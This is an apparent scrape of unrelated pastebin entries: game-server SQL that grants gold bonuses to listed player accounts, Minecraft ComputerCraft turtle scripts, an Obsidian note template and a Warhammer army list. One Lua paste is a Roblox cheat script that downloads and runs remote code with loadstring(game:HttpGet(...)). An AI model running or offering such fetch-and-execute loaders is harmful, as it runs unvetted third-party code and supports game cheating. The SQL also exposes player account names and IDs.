+INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1575085, NOW(), 1000, '1000 золотых бонусов за 28-ой сезон арены SoloQ 3x3.');
+
+UPDATE bonus SET gold=gold+1000 WHERE id=1575811; -- [Gløb] (GUID: 7096946) Аккаунт: credittt (id: 1575811)
+INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1575811, NOW(), 1000, '1000 золотых бонусов за 28-ой сезон арены SoloQ 3x3.');
+
+UPDATE bonus SET gold=gold+1000 WHERE id=844222; -- [Eldkpujo] (GUID: 2816838) Аккаунт: bibesite97 (id: 844222)
+INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (844222, NOW(), 1000, '1000 золотых бонусов за 28-ой сезон арены SoloQ 3x3.');
+
+UPDATE bonus SET gold=gold+3000 WHERE id=1768262; -- [Кубинецтри] (GUID: 6055) Аккаунт: Arkashadps (id: 1768262)
+INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1768262, NOW(), 3000, '3000 золотых бонусов за 13-ый сезон испытания.');
+
+UPDATE bonus SET gold=gold+2750 WHERE id=1850485; -- [Snapshot] (GUID: 26522) Аккаунт: iasonas78 (id: 1850485)
+INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1850485, NOW(), 2750, '2750 золотых бонусов за 13-ый сезон испытания.');
+
+UPDATE bonus SET gold=gold+3000 WHERE id=1850537; -- [Prasin] (GUID: 6045) Аккаунт: iasonas79 (id: 1850537)
+INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1850537, NOW(), 3000, '3000 золотых бонусов за 13-ый сезон испытания.');
+
+UPDATE bonus SET gold=gold+3000 WHERE id=1850483; -- [Clopie] (GUID: 26520) Аккаунт: clopyright (id: 1850483)
+INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1850483, NOW(), 3000, '3000 золотых бонусов за 13-ый сезон испытания.');
+
+UPDATE bonus SET gold=gold+3000 WHERE id=1724886; -- [Эюк] (GUID: 46956) Аккаунт: ganshit (id: 1724886)
+INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1724886, NOW(), 3000, '3000 золотых бонусов за 13-ый сезон испытания.');
+
+UPDATE bonus SET gold=gold+1000 WHERE id=356268; -- [Vebbstor] (GUID: 148828) Аккаунт: kronbog (id: 356268)
+INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (356268, NOW(), 1000, '1000 золотых бонусов за 13-ый сезон испытания.');"
+iJV2HT8c,CobbleGen,ChicagoFire3,Lua,Sunday 8th of June 2025 09:49:17 AM CDT,"require ""GenUtil""
+
+print('Begin Cobble gen...')
+
+while true do
+  ReFuel(false)
+  turtle.digDown()
+  EmptyForward(1)
+end"
+h1uPUpSd,GenUtil,ChicagoFire3,Lua,Sunday 8th of June 2025 09:46:42 AM CDT,"function ReFuel(Silent)
+  if not Silent then
+    print('Refueling...')
+  end
+  local SavedSlot = turtle.getSelectedSlot()
+  turtle.select(1)
+  local ItemCount = turtle.getItemCount()
+  turtle.refuel(ItemCount-1)
+  if not Silent then
+    local FuelCount = turtle.getFuelLevel()
+    local NewItemCount = turtle.getItemCount()
+    print('New FuelCount: ', tostring(FuelCount))
+    print('Items consumed: ', tostring(ItemCount - NewItemCount))
+  end
+  turtle.select(SavedSlot)
+end
+
+function EmptyForward(SkipSlotCount)
+  print('Emptying inventory besides: ', tostring(SkipSlotCount))
+  local SavedSlot = turtle.getSelectedSlot()
+  local i = SkipSlotCount+1
+
+  while i < 17 do
+    turtle.select(i)
+    turtle.drop()
+    i = i+1
+  end
+  turtle.select(SavedSlot)
+end
+
+function EmptyUp(SkipSlotCount)
+  print('Emptying inventory besides: ', tostring(SkipSlotCount))
+  local SavedSlot = turtle.getSelectedSlot()
+  local i = SkipSlotCount+1
+
+  while i < 17 do
+    turtle.select(i)
+    turtle.dropUp()
+    i = i+1
+  end
+  turtle.select(SavedSlot)
+end
+
+function EmptySlot(Slot)
+  --print('Emptying slot: ', tostring(Slot))
+  local SavedSlot = turtle.GetSelectedSlot()
+  turtle.select(Slot)
+  turtle.drop()
+  turtle.select(SavedSlot)
+end"
+SwZYn783,garden script egg,Guitar1203,Lua,Sunday 8th of June 2025 08:28:24 AM CDT,"getgenv().PETS = {
+     ""Red Fox""
+}
+
+loadstring(game:HttpGet(""https:api.luarmor.net/files/v3/loaders/19919f511ace07999bf5a772208c8bef.lua""))()"
+RQPuDmJt,Obsidian template,Icalized,JavaScript,Sunday 8th of June 2025 08:04:34 AM CDT,"<%*
+//Get file title
+let title = tp.file.title;
+if(title.toLowerCase().startsWith(""untitled"")){
+title = await tp.system.prompt(""Title:"");
+await tp.file.rename(title);
+}
+
+// --- Get Category ---
+let category = await tp.system.prompt(""Category:"");
+if (category === """"){
+	// Force format
+	category += ""/general"";
+}
+const folder = category;
+
+// --- Create Folder ---
+const folderPath = `${folder}/`;
+if (!await app.vault.adapter.exists(folderPath)) {
+  await app.vault.createFolder(folderPath);
+}
+
+// --- Move Note ---
+await tp.file.move(`${folderPath}${title}.md`);
+
+
+%>
+
+Created : <% tp.date.now(""dddd, MMMM Do YYYY, h:mm:ss a"") %>
+Curated Links :
+Auto Links:
+
+___
+<% tp.file.cursor() %>
+
+# References
+"
+UYA0UFCT,Ottawa R3 TS,TableTopLive,PHP,Sunday 8th of June 2025 07:45:14 AM CDT,"Ottawa Teams (2000 points)
+
+Thousand Sons
+Strike Force (2000 points)
+Grand Coven
+
+
+CHARACTERS
+
+Daemon Prince of Tzeentch with Wings (195 points)
+• Warlord
+• 1x Dark Blessing
+1x Hellforged weapons
+1x Infernal cannon
+• Enhancement: Eldritch Vortex of E’Taph
+
+Exalted Sorcerer on Disc of Tzeentch (115 points)
+• 1x Arcane Fire
+1x Force weapon
+1x Inferno bolt pistol
+• Enhancement: Incandaeum
+
+Infernal Master (105 points)
+• 1x Fires of the Abyss
+1x Force weapon
+1x Inferno bolt pistol
+• Enhancement: Umbralefic Crystal
+
+Infernal Master (85 points)
+• 1x Fires of the Abyss
+1x Force weapon
+1x Inferno bolt pistol
+
+Infernal Master (85 points)
+• 1x Fires of the Abyss
+1x Force weapon
+1x Inferno bolt pistol
+
+Sorcerer (75 points)
+• 1x Force weapon
+1x Inferno bolt pistol
+1x Pandaemonic Delusion
+1x Prosperine khopesh
+
+Sorcerer (75 points)
+• 1x Force weapon
+1x Inferno bolt pistol
+1x Pandaemonic Delusion
+1x Prosperine khopesh
+
+Tzaangor Shaman (55 points)
+• 1x Baleful Devolution
+1x Force stave
+
+
+BATTLELINE
+
+Rubric Marines (100 points)
+• 1x Aspiring Sorcerer
+• 1x Force weapon
+1x Malefic Curse
+1x Warpflame pistol
+• 4x Rubric Marine
+• 4x Close combat weapon
+1x Icon of Flame
+1x Soulreaper cannon
+3x Warpflamer
+
+Rubric Marines (100 points)
+• 1x Aspiring Sorcerer
+• 1x Force weapon
+1x Malefic Curse
+1x Warpflame pistol
+• 4x Rubric Marine
+• 4x Close combat weapon
+1x Icon of Flame
+1x Soulreaper cannon
+3x Warpflamer
+
+Rubric Marines (100 points)
+• 1x Aspiring Sorcerer
+• 1x Force weapon
+1x Malefic Curse
+1x Warpflame pistol
+• 4x Rubric Marine
+• 4x Close combat weapon
+1x Icon of Flame
+1x Soulreaper cannon
+3x Warpflamer
+
+Rubric Marines (100 points)
+• 1x Aspiring Sorcerer
+• 1x Force weapon
+1x Malefic Curse
+1x Warpflame pistol
+• 4x Rubric Marine
+• 4x Close combat weapon
+1x Icon of Flame
+3x Inferno boltgun
+1x Soulreaper cannon
+
+Rubric Marines (100 points)
+• 1x Aspiring Sorcerer
+• 1x Force weapon
+1x Malefic Curse
+1x Warpflame pistol
+• 4x Rubric Marine
+• 4x Close combat weapon
+1x Icon of Flame
+3x Inferno boltgun
+1x Soulreaper cannon
+
+
+DEDICATED TRANSPORTS
+
+Chaos Rhino (90 points)
+• 1x Armoured tracks
+1x Havoc launcher
+1x Inferno combi-bolter
+1x Inferno combi-weapon
+
+Chaos Rhino (90 points)
+• 1x Armoured tracks
+1x Havoc launcher
+1x Inferno combi-bolter
+1x Inferno combi-weapon
+
+
+OTHER DATASHEETS
+
+Forgefiend (140 points)
+• 3x Ectoplasma cannon
+1x Forgefiend claws
+
+Mutalith Vortex Beast (160 points)
+• 1x Betentacled maw
+1x Mutalith claws
+1x Warp vortex
+
+Tzaangor Enlightened with Fatecaster Greatbows (80 points)
+• 1x Aviarch
+• 1x Close combat weapon
+1x Fatecaster greatbow
+• 5x Enlightened
+• 5x Close combat weapon
+5x Fatecaster greatbow
+
+Tzaangor Enlightened with Fatecaster Greatbows (80 points)
+• 1x Aviarch
+• 1x Close combat weapon
+1x Fatecaster greatbow
+• 5x Enlightened
+• 5x Close combat weapon
+5x Fatecaster greatbow
+
+Tzaangors (70 points)
+• 1x Twistbray
+• 1x Tzaangor blades
+• 9x Tzaangor
+• 1x Brayhorn
+1x Herd banner
+9x Tzaangor blades"
